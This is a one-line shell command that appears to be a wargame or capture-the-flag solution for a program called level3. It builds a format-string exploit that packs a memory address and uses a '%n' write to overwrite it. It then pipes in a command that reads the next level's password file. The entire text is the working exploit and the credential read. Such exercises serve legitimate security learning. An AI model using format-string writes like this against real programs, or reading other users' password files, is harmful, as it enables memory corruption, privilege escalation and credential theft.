(python -c 'import struct; print(struct.pack("<I", 0x804988c) + "%60c%4$n")'; echo "cat /home/user/level4/.pass") | ./level3
